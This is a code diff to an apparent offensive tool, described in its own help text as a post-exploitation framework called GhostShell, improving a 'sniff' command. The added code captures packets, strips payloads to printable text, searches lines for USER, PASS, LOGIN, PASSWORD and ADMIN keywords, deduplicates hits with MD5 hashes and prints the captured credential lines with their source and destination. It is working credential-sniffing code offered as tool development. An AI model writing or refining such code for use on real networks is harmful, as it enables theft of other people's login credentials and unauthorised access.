@@ -14,6 +14,8 @@ from rich.panel import Panel
 import concurrent.futures
 import platform
 import struct
+import hashlib
+import re
 
 app = typer.Typer(help="GhostShell - Post-Exploitation & OS Manipulation Framework")
 console = Console()
@@ -368,6 +370,8 @@ def sniff(
         return
 
     captured = 0
+    last_payload_hash = "" # Deduplication
+
     try:
         while True:
             if count > 0 and captured >= count:
@@ -409,14 +413,28 @@ def sniff(
                     
                     # 4. Analyze Payload for Secrets
                     try:
+                        # Decode and clean: keep only printable ASCII
                         decoded = payload.decode('utf-8', errors='ignore')
-                        keywords = ["USER", "PASS", "LOGIN", "password", "admin"]
+                        clean_text = "".join(char for char in decoded if char.isprintable() or char in ['\n', '\r'])
                         
-                        if any(key in decoded.upper() for key in keywords):
-                            console.print(f"\n[bold red]ALERT: Sensitive Data Found![/bold red]")
-                            console.print(f"From: {socket.inet_ntoa(iph[8])}:{src_port} -> To: {socket.inet_ntoa(iph[9])}:{dest_port}")
-                            console.print(Panel(decoded.strip(), style="yellow"))
-                            captured += 1
+                        keywords = ["USER", "PASS", "LOGIN", "PASSWORD", "ADMIN"]
+                        
+                        # Find lines containing keywords
+                        for line in clean_text.splitlines():
+                            if any(key in line.upper() for key in keywords) and len(line) < 200:
+                                
+                                # Smart Deduplication: Hash ONLY the credential line
+                                line_hash = hashlib.md5(line.encode()).hexdigest()
+                                if line_hash == last_payload_hash:
+                                    continue
+                                
+                                last_payload_hash = line_hash
+                                
+                                console.print(f"\n[bold red]ALERT: Sensitive Data Found![/bold red]")
+                                console.print(f"From: {socket.inet_ntoa(iph[8])}:{src_port} -> To: {socket.inet_ntoa(iph[9])}:{dest_port}")
+                                console.print(Panel(line.strip(), style="yellow"))
+                                captured += 1
+                                break # Found one secret in packet, move to next to avoid spam
                     except:
                         pass
 
